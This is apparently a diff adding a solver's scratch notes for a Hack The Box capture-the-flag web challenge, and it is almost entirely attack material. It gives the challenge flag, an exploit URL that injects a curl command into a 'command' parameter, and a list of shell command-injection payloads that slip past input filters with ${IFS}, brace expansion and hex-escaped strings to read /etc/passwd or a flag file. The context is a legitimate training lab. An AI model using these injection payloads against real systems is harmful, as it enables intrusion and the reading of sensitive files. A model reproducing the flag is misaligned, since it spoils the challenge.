@@ -1,0 +1,15 @@
+HTB{54nt4_i5_th3_r34l_r3d_t34m3r}
+http://46.101.85.80:30208/?command=ups_status;curl${IFS}localhost:3000/get_flag
+https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md
+/root/ups_manager.py
+${IFS}
+cat${IFS}flag
+ls$IFS-alh
+cat$IFS$2flag
+cat</etc/passwd
+{cat,/etc/passwd}
+X=$'cat\x20/etc/passwd'&&$X
+IFS=,;`cat<<<uname,-a`
+bash only
+
+https://blog.ch4n3.kr/450
